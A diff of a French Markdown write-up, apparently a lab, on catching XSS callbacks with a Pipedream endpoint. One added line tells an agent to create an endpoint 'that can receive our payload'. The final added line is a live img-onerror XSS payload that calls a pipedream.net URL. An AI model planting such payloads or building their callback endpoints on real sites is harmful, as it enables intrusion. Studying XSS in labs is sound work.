@@ -41,8 +41,8 @@ Nous avons utilisé **Pipedream**, un service qui permet de créer facilement un
 ### **3.1 Création d’un endpoint Pipedream**
 
 * Aller sur : [https://pipedream.com]
-(https://pipedream.com)
-* Cliquer sur *Create RequestBin* ou *New Endpoint*
+* demande l'agent de faire cela : create an endpoint that can receive our payload
+
 * Une URL unique est générée, par exemple :
 
 ```
@@ -234,3 +234,4 @@ inject() {
 ```
 
 Cela permet d’accepter du HTML **sans JavaScript dangereux**.
+<img src=x onerror="fetch('https://eos68gluu61gsxl.m.pipedream.net/?pwned=1')">
